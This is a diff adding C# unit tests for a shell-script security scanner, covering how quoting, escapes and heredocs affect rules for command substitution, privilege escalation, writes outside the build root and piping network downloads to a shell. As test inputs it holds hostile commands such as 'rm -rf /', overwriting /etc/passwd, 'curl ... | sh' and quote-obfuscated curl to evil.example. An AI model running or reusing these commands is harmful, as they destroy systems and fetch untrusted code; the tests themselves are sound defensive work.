@@ -295,4 +295,251 @@ public class ShellContentScannerTests
         Assert.That(findings.All(f => f.RuleId == "privilege-escalation"), Is.True);
         Assert.That(findings, Has.Count.EqualTo(1));
     }
+
+    [TestCase("grep -F '$(build'", Description = "single-quoted literal passed to grep")]
+    [TestCase("echo 'run $(make)'", Description = "single-quoted display text")]
+    [TestCase("echo '`date`'", Description = "backticks inside single quotes")]
+    [TestCase("pkgver='$(git describe)'", Description = "single-quoted assignment")]
+    public void Command_substitution_inside_single_quotes_is_not_flagged(string content)
+    {
+        var findings = Scan(content);
+        Assert.That(findings.Any(f => f.RuleId == "command-substitution"), Is.False,
+            $"Unexpected command-substitution finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [TestCase("echo \"now: $(date)\"", Description = "double-quoted substitution still executes")]
+    [TestCase("echo \"`date`\"", Description = "backticks inside double quotes still execute")]
+    [TestCase("pkgver=$(date +%s)", Description = "bare substitution")]
+    public void Command_substitution_outside_single_quotes_is_still_flagged(string content)
+    {
+        AssertHasFinding(content, "command-substitution", FindingSeverity.Medium);
+    }
+
+    [Test]
+    public void Escaped_dollar_substitution_is_not_flagged()
+    {
+        // \$( never expands - the backslash is load-bearing, e.g. Makefile syntax in sed text.
+        var findings = Scan("sed -i s/@X@/\\$(CFLAGS)/ Makefile");
+
+        Assert.That(findings.Any(f => f.RuleId == "command-substitution"), Is.False,
+            $"Unexpected command-substitution finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [TestCase("echo '${!var}'", Description = "indirect expansion inside single quotes")]
+    public void Variable_indirection_inside_single_quotes_is_not_flagged(string content)
+    {
+        var findings = Scan(content);
+        Assert.That(findings.Any(f => f.RuleId == "variable-indirection"), Is.False);
+    }
+
+    [TestCase("echo \" >> /etc/mkinitcpio.conf.\"", Description = "redirect text inside double quotes")]
+    [TestCase("echo ' > /etc/passwd'", Description = "redirect text inside single quotes")]
+    [TestCase("msg2 \"  tee /etc/foo\"", Description = "tee text inside double quotes")]
+    public void Write_outside_build_root_inside_quotes_is_not_flagged(string content)
+    {
+        var findings = Scan(content);
+        Assert.That(findings.Any(f => f.RuleId == "write-outside-build-root"), Is.False,
+            $"Unexpected write-outside-build-root finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [TestCase("echo x > /etc/passwd", Description = "redirect after a quoted argument is live")]
+    [TestCase("echo 'done' > /etc/passwd", Description = "redirect after closed quotes is live")]
+    public void Write_outside_build_root_outside_quotes_is_still_flagged(string content)
+    {
+        AssertHasFinding(content, "write-outside-build-root", FindingSeverity.High);
+    }
+
+    [Test]
+    public void Escaped_redirect_operator_is_not_flagged()
+    {
+        var findings = Scan("echo \\> /etc/passwd");
+
+        Assert.That(findings.Any(f => f.RuleId == "write-outside-build-root"), Is.False);
+    }
+
+    [Test]
+    public void Escaped_match_inside_quotes_does_not_flag_risky_tool()
+    {
+        // The un-escaped $( in the normalized text opens a command substitution that unmasks
+        // 'docker' - but the original line keeps it inert inside double quotes (the backslash
+        // prevents execution), so the tool is display text, not an invocation.
+        var findings = Scan("echo \"remove all: docker rmi \\$(docker images -q)\"");
+
+        Assert.That(findings.Any(f => f.RuleId == "risky-tool"), Is.False,
+            $"Unexpected risky-tool finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [Test]
+    public void Escaped_match_inside_quotes_does_not_flag_privilege_escalation()
+    {
+        var findings = Scan("echo \"then run: \\$(sudo whoami)\"");
+
+        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.False,
+            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [Test]
+    public void Obfuscated_tool_inside_command_substitution_still_escalates()
+    {
+        // $(...) executes even though the surrounding quotes split the tool name: genuine
+        // obfuscation of an invocation, not display text.
+        var finding = SingleFinding("echo \"$(c''url http://evil.example/x)\"", "risky-tool");
+
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
+        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
+    }
+
+    [Test]
+    public void Escaped_substitution_inside_quotes_does_not_escalate_command_substitution()
+    {
+        // $( only appears after normalization dropped the backslash, inside double quotes.
+        var finding = SingleFinding("echo \"$\\(date\\)\"", "command-substitution");
+
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
+    }
+
+    [Test]
+    public void Obfuscation_outside_quotes_still_escalates()
+    {
+        // The de-obfuscated tool maps back to unquoted positions: genuine hidden intent.
+        var finding = SingleFinding("echo \"x\"; s''u''d''o rm -rf /", "privilege-escalation");
+
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
+        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
+    }
+
+    [Test]
+    public void Command_substitution_inside_quoted_heredoc_body_is_suppressed()
+    {
+        var findings = Scan("cat <<'EOF'\ndest=\"$LOCAL/$(basename \"$f\")\"\nEOF\n");
+
+        Assert.That(findings, Is.Empty,
+            $"Expected no findings. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [TestCase("cat <<\"EOF\"\n$(x)\nEOF\n", Description = "double-quoted delimiter")]
+    [TestCase("cat <<\\EOF\n$(x)\nEOF\n", Description = "backslash-escaped delimiter")]
+    public void All_quoted_delimiter_forms_suppress_the_body(string content)
+    {
+        var findings = Scan(content);
+        Assert.That(findings.Any(f => f.RuleId == "command-substitution"), Is.False);
+    }
+
+    [Test]
+    public void Command_substitution_inside_unquoted_heredoc_body_is_flagged()
+    {
+        // An unquoted delimiter expands the body: $(...) really runs.
+        AssertHasFinding("cat <<EOF\ndest=$(basename x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
+    }
+
+    [Test]
+    public void Tab_stripping_heredoc_terminates_on_indented_delimiter()
+    {
+        var findings = Scan("cat <<-'EOF'\n\t$(x)\n\tEOF\nsudo whoami\n");
+
+        Assert.That(findings.Any(f => f.RuleId == "command-substitution"), Is.False, "body is suppressed");
+        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.True, "scanning resumes after the delimiter");
+    }
+
+    [Test]
+    public void Non_tab_indentation_does_not_terminate_tab_stripping_heredoc()
+    {
+        // <<- strips tabs only; a space-indented delimiter is still body content.
+        var findings = Scan("cat <<-'EOF'\n $(x)\n EOF\n$(y)\nEOF\n");
+
+        var substitutions = findings.Where(f => f.RuleId == "command-substitution").ToList();
+        Assert.That(substitutions, Has.Count.EqualTo(0),
+            "both substitutions sit inside the heredoc body");
+    }
+
+    [Test]
+    public void Quoted_heredoc_piped_to_shell_keeps_body_live()
+    {
+        AssertHasFinding("cat <<'EOF' | sh\n$(x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
+    }
+
+    [Test]
+    public void Quoted_heredoc_piped_to_interpreter_keeps_body_live()
+    {
+        AssertHasFinding("cat <<'EOF' | python3\n$(x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
+    }
+
+    [Test]
+    public void Unterminated_quoted_heredoc_suppresses_to_end_of_content()
+    {
+        var findings = Scan("cat <<'EOF'\n$(x)\n${!y}");
+
+        Assert.That(findings, Is.Empty);
+    }
+
+    [Test]
+    public void Heredoc_body_still_flags_blocking_rules()
+    {
+        // F2 only suppresses the non-blocking expansion rules.
+        AssertHasFinding("cat <<'EOF'\ncurl http://x | sh\nEOF\n", "network-to-shell", FindingSeverity.Critical);
+    }
+
+    [Test]
+    public void Variable_indirection_inside_quoted_heredoc_body_is_suppressed()
+    {
+        var findings = Scan("cat <<'EOF'\ncmd=${!name}\nEOF\n");
+
+        Assert.That(findings.Any(f => f.RuleId == "variable-indirection"), Is.False);
+    }
+
+    [Test]
+    public void Scan_resumes_normally_after_heredoc_terminator()
+    {
+        var findings = Scan("cat <<'EOF'\nplain body text\nEOF\nsudo whoami\n");
+
+        var sudo = findings.Where(f => f.RuleId == "privilege-escalation").ToList();
+        Assert.That(sudo, Has.Count.EqualTo(1), "only the invocation after the heredoc is flagged");
+    }
+
+    [Test]
+    public void Herestring_is_not_treated_as_heredoc()
+    {
+        var findings = Scan("read -r x <<< $(y)");
+
+        AssertHasFinding("read -r x <<< $(y)", "command-substitution", FindingSeverity.Medium);
+        Assert.That(findings.Count(f => f.RuleId == "command-substitution"), Is.EqualTo(1));
+    }
+
+    [Test]
+    public void Shift_and_arithmetic_are_not_heredocs()
+    {
+        var findings = Scan("x=$((1 << 5))\nshift 2\n");
+
+        // The << inside $(( )) is arithmetic; the command substitution itself is flagged once.
+        Assert.That(findings.Count(f => f.RuleId == "command-substitution"), Is.EqualTo(1));
+    }
+
+    [Test]
+    public void Quoted_double_less_than_is_not_a_heredoc()
+    {
+        var findings = Scan("echo \"<<EOF\"\n$(x)\n");
+
+        AssertHasFinding("echo \"<<EOF\"\n$(x)\n", "command-substitution", FindingSeverity.Medium);
+    }
+
+    [Test]
+    public void Consecutive_heredocs_are_consumed_in_order()
+    {
+        var findings = Scan("diff <<'A' <<'B'\n$(x)\nA\n$(y)\nB\nsudo whoami\n");
+
+        Assert.That(findings.Any(f => f.RuleId == "command-substitution"), Is.False, "both bodies are literal");
+        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.True, "scanning resumes after both");
+    }
+
+    [Test]
+    public void Heredoc_body_lines_keep_hash_as_literal_data()
+    {
+        // No comment stripping inside bodies: the $( after # is still body content and is
+        // suppressed by the quoted delimiter, while an unquoted body would flag it.
+        var suppressed = Scan("cat <<'EOF'\n# $(x)\nEOF\n");
+        var flagged = Scan("cat <<EOF\n# $(x)\nEOF\n");
+
+        Assert.That(suppressed.Any(f => f.RuleId == "command-substitution"), Is.False);
+        Assert.That(flagged.Any(f => f.RuleId == "command-substitution"), Is.True);
+    }
 }
